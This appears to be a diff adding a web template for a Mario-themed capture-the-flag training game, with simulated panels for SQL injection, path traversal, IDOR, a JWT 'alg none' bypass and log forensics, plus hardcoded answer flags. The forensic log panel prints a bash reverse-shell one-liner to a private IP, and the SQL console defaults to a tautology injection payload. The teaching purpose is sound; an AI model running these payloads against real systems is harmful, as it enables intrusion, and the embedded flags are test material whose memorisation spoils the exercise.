@@ -1,0 +1,437 @@
+{% extends "base.html" %}
+
+{% block title %}🔎 {{ challenge.title }} | Mario: The Cyber Heist{% endblock %}
+
+{% block content %}
+<div class="challenge-page-container">
+    <div class="challenge-topbar">
+        <div style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
+            <a href="{{ url_for('game.index', home=1) }}" class="back-btn" title="Go to Title Screen Island">🏠 TITLE</a>
+            <a href="{{ url_for('game.world_map') }}" class="back-btn">⬅️ 3D MAP</a>
+            <div style="display: flex; gap: 6px; align-items: center; background: rgba(0,0,0,0.4); padding: 4px 10px; border-radius: 6px; border: 1px solid var(--border-glow);">
+                <span style="font-family: var(--font-heading); color: var(--cyber-cyan); font-size: 0.8rem; margin-right: 4px;">
+                    {{ challenge.world.icon }} {{ challenge.world.name }}:
+                </span>
+                {% if challenge.world_challenges %}
+                    {% for ch in challenge.world_challenges %}
+                    <a href="{{ url_for('challenges.view_challenge', challenge_id=ch.id) }}" 
+                       class="nav-link {% if ch.id == challenge.id %}active{% endif %}" 
+                       style="padding: 4px 8px; font-size: 0.8rem; display: inline-flex; align-items: center; gap: 4px;">
+                       Case {{ loop.index }} {% if ch.is_solved %}✅{% endif %}
+                    </a>
+                    {% endfor %}
+                {% endif %}
+            </div>
+        </div>
+        <div style="display: flex; gap: 10px; align-items: center;">
+            {% if challenge.prev_challenge_id %}
+            <a href="{{ url_for('challenges.view_challenge', challenge_id=challenge.prev_challenge_id) }}" class="btn-secondary" style="padding: 6px 14px; font-size: 0.8rem;">
+                ⬅️ PREV CASE
+            </a>
+            {% endif %}
+            {% if challenge.next_challenge_id %}
+            <a href="{{ url_for('challenges.view_challenge', challenge_id=challenge.next_challenge_id) }}" class="btn-primary" style="padding: 6px 14px; font-size: 0.8rem;">
+                NEXT CASE ➡️
+            </a>
+            {% endif %}
+        </div>
+    </div>
+
+    <!-- Main Challenge Layout -->
+    <div class="challenge-grid">
+        <!-- LEFT COLUMN: Forensic Evidence Workbench -->
+        <div class="cyber-card">
+            <div class="challenge-meta-header">
+                <div>
+                    <div class="challenge-tags">
+                        <span class="badge-tag badge-category">{{ challenge.category }}</span>
+                        <span class="badge-tag {% if challenge.difficulty == 'Easy' %}badge-diff-easy{% elif challenge.difficulty == 'Medium' %}badge-diff-med{% elif challenge.difficulty == 'Hard' %}badge-diff-hard{% else %}badge-diff-expert{% endif %}">
+                            {{ challenge.difficulty }}
+                        </span>
+                    </div>
+                    <h1 class="challenge-title-main">{{ challenge.title }}</h1>
+                </div>
+                <div class="reward-badges">
+                    <span class="reward-item pts">+{{ challenge.points }} PTS</span>
+                    <span class="reward-item coins">+{{ challenge.coins_reward }} 🪙</span>
+                    <span class="reward-item stars">+{{ challenge.star_reward }} ⭐</span>
+                </div>
+            </div>
+
+            <div class="card-title">🔬 FORENSIC EVIDENCE TERMINAL</div>
+
+            <!-- Dynamic Tool Mount by interactive_type -->
+            {% if challenge.interactive_type == 'web_dom' %}
+            <div class="dom-inspector-card">
+                <div class="dom-toolbar">
+                    <span style="color: var(--cyber-gold); font-family: var(--font-heading); font-size: 0.85rem; display: flex; align-items: center; gap: 6px;">
+                        ⚠️ LIVE TARGET: CORRUPTED VILLAGE BULLETIN BOARD
+                    </span>
+                    <button id="tool-dom-inspect-btn" class="btn-secondary" style="padding: 7px 14px; font-size: 0.8rem;">
+                        🔍 TOGGLE DEVTOOLS DOM INSPECTOR
+                    </button>
+                </div>
+                <!-- Simulated Glitched Notice Board -->
+                <div style="border: 1px solid rgba(0, 255, 102, 0.35); padding: 18px; border-radius: 8px; background: rgba(0, 255, 102, 0.03); color: #00ff66;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; border-bottom: 1px solid rgba(0, 255, 102, 0.2); padding-bottom: 6px;">
+                        <span style="font-family: var(--font-display); font-size: 0.85rem;">🍄 MUSHROOM VILLAGE NOTICE #04</span>
+                        <span style="font-family: monospace; font-size: 0.75rem; color: #66ff99;">PORT: 8080 // HTTP 200 OK</span>
+                    </div>
+                    <p style="font-size: 0.95rem; margin-bottom: 8px;">WARNING: Unauthorized quantum beacon detected near the warp conduit at 03:12 UTC.</p>
+                    <p style="color: #ffaa00; font-size: 0.8rem; font-family: monospace;">[RENDER WARNING]: Element &lt;div class="cyber-token-container"&gt; obscured by DOM comment.</p>
+                </div>
+
+                <!-- Inspectable DOM Tree with commented payload -->
+                <div id="tool-dom-tree" class="hidden" style="margin-top: 14px;">
+                    <div style="font-family: var(--font-heading); font-size: 0.75rem; color: #8da4d0; margin-bottom: 6px; display: flex; justify-content: space-between;">
+                        <span>DEVELOPER TOOLS // &lt;DOM_TREE&gt;</span>
+                        <span style="color: var(--cyber-cyan);">RIGHT CLICK $\rightarrow$ INSPECT SIMULATION</span>
+                    </div>
+                    <pre class="dom-code">&lt;div id="village-bulletin-board" class="secure-node"&gt;
+    &lt;h3&gt;🍄 MUSHROOM VILLAGE NOTICE #04&lt;/h3&gt;
+    &lt;p&gt;WARNING: Unauthorized quantum beacon detected near warp conduit...&lt;/p&gt;
+    
+    &lt;!-- FORENSIC TRACE: Infiltrator left encrypted session payload in DOM comment --&gt;
+    &lt;!-- cyber-heist-token: FLAG{MUSHROOM_SECRET_OJAS_2026} --&gt;
+    
+    &lt;div class="cyber-token-container" data-hash="e8a93b4f" data-status="corrupted" style="display:none;"&gt;
+        &lt;span class="payload"&gt;FLAG{MUSHROOM_SECRET_OJAS_2026}&lt;/span&gt;
+    &lt;/div&gt;
+&lt;/div&gt;</pre>
+                </div>
+            </div>
+
+            {% elif challenge.interactive_type == 'cipher_stream' %}
+            <div class="dom-inspector-card">
+                <span style="color: var(--cyber-cyan); font-family: var(--font-heading); font-size: 0.85rem;">
+                    📡 INTERCEPTED CIPHER STREAM // CAESAR ROT ANALYZER
+                </span>
+                <div class="terminal-window">
+                    <div class="terminal-body" style="font-size: 1.1rem; color: #ff2a4d;">
+                        RAW CIPHERTEXT: SYNT{YRGGRE_PVCURE_FBYIRQ_BWNF}
+                    </div>
+                </div>
+
+                <div class="slider-container">
+                    <label style="font-family: var(--font-heading); font-size: 0.85rem; color: #8da4d0; display: block; margin-bottom: 8px;">
+                        CAESAR ROTATION SHIFT: <span id="rot-val" style="color: var(--cyber-cyan); font-weight: bold;">0</span>
+                    </label>
+                    <input id="rot-slider" type="range" min="0" max="25" value="0" class="cyber-slider" data-original="SYNT{YRGGRE_PVCURE_FBYIRQ_BWNF}">
+                </div>
+
+                <div id="rot-output" class="cipher-output-box">
+                    SYNT{YRGGRE_PVCURE_FBYIRQ_BWNF}
+                </div>
+                <div style="font-size: 0.8rem; color: #7890ba; margin-top: 8px; text-align: center;">
+                    💡 Drag the slider to shift letter offsets until recognizable English appears! (Try ROT13)
+                </div>
+            </div>
+
+            {% elif challenge.interactive_type == 'stego_viewer' %}
+            <div class="dom-inspector-card">
+                <span style="color: var(--cyber-cyan); font-family: var(--font-heading); font-size: 0.85rem;">
+                    🖼️ DRONE SENSOR STEGANOGRAPHY BITPLANE VIEWER
+                </span>
+                <div style="text-align: center; margin: 14px 0;">
+                    <canvas id="stego-canvas" style="border: 1px solid var(--border-glow); border-radius: 4px; max-width: 100%;"></canvas>
+                </div>
+                <div style="display: flex; gap: 8px; justify-content: center; flex-wrap: wrap;">
+                    <button class="btn-secondary stego-filter-btn active" data-filter="rgb">RGB COMPOSITE</button>
+                    <button class="btn-secondary stego-filter-btn" data-filter="red">RED PLANE</button>
+                    <button class="btn-secondary stego-filter-btn" data-filter="green">GREEN PLANE</button>
+                    <button class="btn-secondary stego-filter-btn" data-filter="lsb">LSB BITPLANE 0</button>
+                </div>
+            </div>
+
+            {% elif challenge.interactive_type == 'exif_analyzer' %}
+            <div class="dom-inspector-card">
+                <span style="color: var(--cyber-cyan); font-family: var(--font-heading); font-size: 0.85rem;">
+                    📷 DRONE RAW EXIF METADATA TERMINAL
+                </span>
+                <div class="terminal-window">
+                    <div class="terminal-body" style="font-size: 0.85rem;">
+                        [EXIF TAG DUMP: evidence_pine_drone.raw]<br>
+                        Camera Model: RoboKoopa Drone Mk.IV<br>
+                        Firmware: v4.19.2-cyber<br>
+                        GPS Latitude: 12° 58' 23.4" N<br>
+                        GPS Longitude: 77° 35' 45.1" E<br>
+                        Software: CyberHeist_Stealth_Encoder<br>
+                        ImageDescription: Sector 02 Autonomous Recon<br>
+                        <strong>UserComment: FLAG{METADATA_TRAIL_REVEALED_OJAS}</strong><br>
+                        Artist: Operator-Phantom
+                    </div>
+                </div>
+            </div>
+
+            {% elif challenge.interactive_type == 'network_proxy' %}
+            <div class="dom-inspector-card">
+                <span style="color: var(--cyber-cyan); font-family: var(--font-heading); font-size: 0.85rem;">
+                    🌐 WI-FI BEACON HEX STREAM CAPTURE
+                </span>
+                <div class="terminal-window">
+                    <div class="terminal-body">
+                        00000000: 46 4c 41 47 7b 44 41 52  |FLAG{DAR|<br>
+                        00000008: 4b 5f 46 4f 52 45 53 54  |K_FOREST|<br>
+                        00000010: 5f 53 54 52 45 41 4d 5f  |_STREAM_|<br>
+                        00000018: 44 45 43 4f 44 45 44 7d  |DECODED}|
+                    </div>
+                </div>
+                <div style="font-size: 0.85rem; color: #00ff66; margin-top: 10px;">
+                    ASCII STREAM RECONSTRUCTED: <strong>FLAG{DARK_FOREST_STREAM_DECODED}</strong>
+                </div>
+            </div>
+
+            {% elif challenge.interactive_type == 'directory_hunt' %}
+            <div class="dom-inspector-card">
+                <span style="color: var(--cyber-cyan); font-family: var(--font-heading); font-size: 0.85rem;">
+                    👻 HAUNTED MANSION WEB SERVER FILE EXPLORER
+                </span>
+                <div style="display: flex; gap: 8px; margin: 12px 0;">
+                    <input id="traversal-path-input" type="text" class="flag-input" value="/robots.txt" placeholder="/path/to/file">
+                    <button id="traversal-go-btn" class="btn-secondary">FETCH</button>
+                </div>
+                <div id="traversal-output" class="terminal-window">
+                    <div class="terminal-body">
+                        Click "FETCH" to probe the web server path... Try /robots.txt or path traversal (../../secret_attic/ghost_manifesto.bak)
+                    </div>
+                </div>
+            </div>
+
+            {% elif challenge.interactive_type == 'idor_api' %}
+            <div class="dom-inspector-card">
+                <span style="color: var(--cyber-cyan); font-family: var(--font-heading); font-size: 0.85rem;">
+                    🛡️ BOO'S VAULT API REQUEST REPLAY TOOL
+                </span>
+                <div style="margin: 12px 0; display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                    <div>
+                        <label style="font-size: 0.8rem; color: #8da4d0;">ENDPOINT PARAM (locker_id):</label>
+                        <input id="idor-locker-id" type="text" class="flag-input" value="1042">
+                    </div>
+                    <div>
+                        <label style="font-size: 0.8rem; color: #8da4d0;">HEADER (X-Access-Level):</label>
+                        <input id="idor-header-val" type="text" class="flag-input" value="guest">
+                    </div>
+                </div>
+                <button id="idor-send-btn" class="btn-secondary" style="width: 100%; margin-bottom: 12px;">
+                    SEND INTERCEPTED API REQUEST
+                </button>
+                <div id="idor-response" class="terminal-window">
+                    <div class="terminal-body">
+                        Click "SEND INTERCEPTED API REQUEST" to test response...
+                    </div>
+                </div>
+            </div>
+
+            {% elif challenge.interactive_type == 'jwt_forge' %}
+            <div class="dom-inspector-card">
+                <span style="color: var(--cyber-cyan); font-family: var(--font-heading); font-size: 0.85rem;">
+                    🔑 POLTERGEIST JWT TOKEN FORGE WORKBENCH
+                </span>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 12px 0;">
+                    <div>
+                        <label style="font-size: 0.8rem; color: #8da4d0;">TOKEN ROLE:</label>
+                        <select id="jwt-role-select" class="flag-input" style="padding: 8px;">
+                            <option value="guest">guest</option>
+                            <option value="officer">officer</option>
+                            <option value="admin">admin</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label style="font-size: 0.8rem; color: #8da4d0;">SIGNATURE ALGORITHM (alg):</label>
+                        <select id="jwt-alg-select" class="flag-input" style="padding: 8px;">
+                            <option value="HS256">HS256 (Signed)</option>
+                            <option value="none">none (Unsigned Bypass)</option>
+                        </select>
+                    </div>
+                </div>
+                <div id="jwt-token-output" style="background: #050a14; border: 1px solid var(--border-glow); padding: 10px; font-family: monospace; font-size: 0.8rem; word-break: break-all; color: var(--cyber-cyan); margin-bottom: 12px;">
+                    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3Vlc3QiLCJ1c2VyIjoiaW5zcGVjdG9yIiwicmVhbG0iOiJoYXVudGVkX21hbnNpb24ifQ.k8Xz9A7L_simulated_sig
+                </div>
+                <button id="jwt-verify-btn" class="btn-secondary" style="width: 100%;">
+                    TRANSMIT FORGED SESSION COOKIE
+                </button>
+                <div id="jwt-result" class="terminal-window" style="margin-top: 10px;">
+                    <div class="terminal-body">
+                        Waiting for session submission...
+                    </div>
+                </div>
+            </div>
+
+            {% elif challenge.interactive_type == 'recon_file' %}
+            <div class="dom-inspector-card">
+                <span style="color: var(--cyber-cyan); font-family: var(--font-heading); font-size: 0.85rem;">
+                    📁 SHELLSHOCK BREACHED SERVER FORENSIC LOG
+                </span>
+                <div class="terminal-window">
+                    <div class="terminal-body" style="font-size: 0.85rem;">
+                        $ cat /home/shellshock/.bash_logout.bak<br>
+                        # Infiltrator reverse shell injection trace:<br>
+                        nohup /bin/bash -i >& /dev/tcp/10.99.13.37/4444 0>&1 &<br>
+                        # Timestamp 48 hours prior to Golden Star breach.<br>
+                        # Shellshock was framed! Confirmation Token: <strong>FLAG{SHELLSHOCK_WAS_FRAMED_OJAS}</strong>
+                    </div>
+                </div>
+            </div>
+
+            {% elif challenge.interactive_type == 'log_siem' %}
+            <div class="dom-inspector-card">
+                <span style="color: var(--cyber-cyan); font-family: var(--font-heading); font-size: 0.85rem;">
+                    📊 KOOPA FORTRESS CENTRAL SIEM LOG ANALYZER
+                </span>
+                <div class="terminal-window">
+                    <div class="terminal-body" style="font-size: 0.8rem;">
+                        [QUERY: IP=10.99.13.37 AND STATUS=200]<br>
+                        Timestamp: 03:13:58 UTC<br>
+                        Client IP: 10.99.13.37<br>
+                        Request: POST /internal/admin/override HTTP/1.1<br>
+                        Status: 200 OK<br>
+                        User-Agent: Insider-Infiltrator/1.0 (FlagPayload: <strong>FLAG{CORRELATED_LOGS_INSIDER_OJAS}</strong>)<br>
+                        Payload: {"action": "disable_perimeter_grid", "token": "INSIDER"}
+                    </div>
+                </div>
+            </div>
+
+            {% elif challenge.interactive_type == 'sqli_shell' %}
+            <div class="dom-inspector-card">
+                <span style="color: var(--cyber-cyan); font-family: var(--font-heading); font-size: 0.85rem;">
+                    💉 KOOPA PERSONNEL DATABASE SQL CONSOLE
+                </span>
+                <div style="display: flex; gap: 8px; margin: 12px 0;">
+                    <input id="sqli-input" type="text" class="flag-input" value="' OR '1'='1" placeholder="Search badge ID or injection payload...">
+                    <button id="sqli-btn" class="btn-secondary">QUERY DB</button>
+                </div>
+                <div id="sqli-output" class="terminal-window">
+                    <div class="terminal-body">
+                        Click "QUERY DB" to execute SQL lookup... Try tautology (' OR '1'='1)
+                    </div>
+                </div>
+            </div>
+            {% endif %}
+        </div>
+
+        <!-- RIGHT COLUMN: Dossier, Hints, Flag Submission -->
+        <div>
+            <!-- Scenario Card -->
+            <div class="cyber-card">
+                <div class="card-title">📜 INVESTIGATION DOSSIER</div>
+                <p style="color: #b0c2de; font-size: 0.95rem; margin-bottom: 14px;">
+                    {{ challenge.description }}
+                </p>
+                <div style="background: rgba(0, 240, 255, 0.05); border-left: 3px solid var(--cyber-cyan); padding: 12px; border-radius: 4px; font-size: 0.9rem; color: #d0e0ff;">
+                    {{ challenge.forensic_brief }}
+                </div>
+            </div>
+
+            <!-- Hints Shop -->
+            <div class="cyber-card">
+                <div class="card-title">💡 FORENSIC HINTS</div>
+                <div class="hints-container">
+                    <!-- Hint 1 -->
+                    <div id="hint-1-container">
+                        {% if 1 in challenge.hints_unlocked %}
+                        <div class="hint-unlocked-card">
+                            <span class="hint-tag">💡 FORENSIC CLUE #1</span>
+                            <p>{{ challenge.hint_1 }}</p>
+                        </div>
+                        {% else %}
+                        <div class="hint-box">
+                            <div>
+                                <span style="font-family: var(--font-heading); font-size: 0.85rem; color: #fff;">Forensic Clue #1</span>
+                                <div style="font-size: 0.8rem; color: var(--cyber-gold);">Cost: {{ challenge.hint_1_cost }} Cyber Coins</div>
+                            </div>
+                            <button class="btn-unlock-hint" data-challenge-id="{{ challenge.id }}" data-hint-num="1" data-cost="{{ challenge.hint_1_cost }}">
+                                UNLOCK (-{{ challenge.hint_1_cost }} 🪙)
+                            </button>
+                        </div>
+                        {% endif %}
+                    </div>
+
+                    <!-- Hint 2 -->
+                    <div id="hint-2-container">
+                        {% if 2 in challenge.hints_unlocked %}
+                        <div class="hint-unlocked-card">
+                            <span class="hint-tag">💡 FORENSIC CLUE #2</span>
+                            <p>{{ challenge.hint_2 }}</p>
+                        </div>
+                        {% else %}
+                        <div class="hint-box">
+                            <div>
+                                <span style="font-family: var(--font-heading); font-size: 0.85rem; color: #fff;">Deep Cryptographic Clue #2</span>
+                                <div style="font-size: 0.8rem; color: var(--cyber-gold);">Cost: {{ challenge.hint_2_cost }} Cyber Coins</div>
+                            </div>
+                            <button class="btn-unlock-hint" data-challenge-id="{{ challenge.id }}" data-hint-num="2" data-cost="{{ challenge.hint_2_cost }}">
+                                UNLOCK (-{{ challenge.hint_2_cost }} 🪙)
+                            </button>
+                        </div>
+                        {% endif %}
+                    </div>
+                </div>
+            </div>
+
+            <!-- Flag Submission Terminal -->
+            <div class="cyber-card">
+                <div class="card-title">🚩 FLAG SUBMISSION TERMINAL</div>
+                {% if challenge.is_solved %}
+                <div class="flag-alert-box alert-success" style="margin-bottom: 16px;">
+                    <strong>🌟 CASE RESOLVED!</strong> Correct flag verified.
+                </div>
+                {% if challenge.next_challenge_id %}
+                <a href="{{ url_for('challenges.view_challenge', challenge_id=challenge.next_challenge_id) }}" class="btn-primary" style="width: 100%; text-align: center; justify-content: center; font-size: 1.05rem; padding: 16px 20px; animation: pulseButton 2s infinite ease-in-out;">
+                    ADVANCE TO: {{ challenge.next_challenge_title or 'NEXT CASE' }} ➡️
+                </a>
+                {% else %}
+                <a href="{{ url_for('game.world_map') }}" class="btn-primary" style="width: 100%; text-align: center; justify-content: center; font-size: 1.05rem; padding: 16px 20px;">
+                    RETURN TO 3D WORLD MAP 🗺️
+                </a>
+                {% endif %}
+                {% else %}
+                <form id="flag-form" class="flag-form">
+                    <input id="flag-input" type="text" class="flag-input" placeholder="FLAG{...}" data-challenge-id="{{ challenge.id }}" autocomplete="off">
+                    <button id="flag-submit-btn" type="submit" class="btn-primary" style="width: 100%;">
+                        SUBMIT FLAG 🚀
+                    </button>
+                    <div id="flag-alert" class="flag-alert-box hidden"></div>
+                </form>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Solve Celebration Modal -->
+<div id="solve-modal" class="modal-backdrop hidden">
+    <div class="modal-content" style="text-align: center;">
+        <div style="font-size: 3.5rem; margin-bottom: 12px;">⭐ 🍄 ⭐</div>
+        <h2 style="font-family: var(--font-display); font-size: 1.4rem; color: var(--cyber-gold); margin-bottom: 8px;">
+            INVESTIGATION SOLVED!
+        </h2>
+        <p style="color: #a0b5dd; font-size: 1rem; margin-bottom: 16px;">
+            Evidence packet deciphered! New sector telemetry decoded.
+        </p>
+
+        <div id="solve-unlock-notice" class="flag-alert-box alert-success hidden" style="margin-bottom: 18px; font-size: 1rem;"></div>
+
+        <div style="display: flex; justify-content: center; gap: 20px; margin-bottom: 24px;">
+            <div class="stat-pill stars" id="solve-stars-earned">+1 ⭐</div>
+            <div class="stat-pill coins" id="solve-coins-earned">+50 🪙</div>
+            <div class="stat-pill score" id="solve-points-earned">+100 PTS</div>
+        </div>
+
+        <div style="display: flex; gap: 14px; justify-content: center; flex-wrap: wrap;">
+            <a id="solve-next-btn" href="{{ url_for('challenges.view_challenge', challenge_id=challenge.next_challenge_id) if challenge.next_challenge_id else url_for('game.world_map') }}" class="btn-primary" style="font-size: 1.05rem; padding: 14px 28px;">
+                PROCEED TO NEXT CASE ➡️
+            </a>
+            <a href="{{ url_for('game.world_map') }}" class="btn-secondary">
+                WORLD MAP 🗺️
+            </a>
+            <a href="{{ url_for('game.leaderboard') }}" class="btn-secondary">
+                CHECK LEADERBOARD 🏆
+            </a>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_scripts %}
+<script src="{{ url_for('static', filename='js/challenge.js') }}"></script>
+{% endblock %}
